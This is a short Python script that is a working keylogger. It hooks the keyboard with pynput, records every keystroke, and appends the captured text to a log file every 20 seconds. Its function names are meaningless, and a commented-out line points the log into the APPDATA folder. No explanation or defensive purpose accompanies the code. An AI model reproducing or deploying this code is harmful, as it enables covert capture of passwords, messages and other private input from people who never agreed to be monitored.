try:
    import pynput.keyboard as f
    import threading,pickle
    import os
except Exception as e:
    with open("log.txt","a") as f:
        f.write("\n" + str(e))

log = ""
#dirr = os.environ["appdata"]+"log.txt"
def juv756(key):
    global log
    try:
        log += str(key.char)
    except AttributeError:
        if key == key.space:
            log += " "
        else:    
            log += " " + str(key) + " "
            
def gtbre5():
    global log
    with open("log.txt","a") as f:
        f.write("\n" + log)
    log = ""
    timer = threading.Timer(20, gtbre5)
    timer.start()
    
with f.Listener(on_press=juv756) as logg:
    gtbre5()
    logg.join()

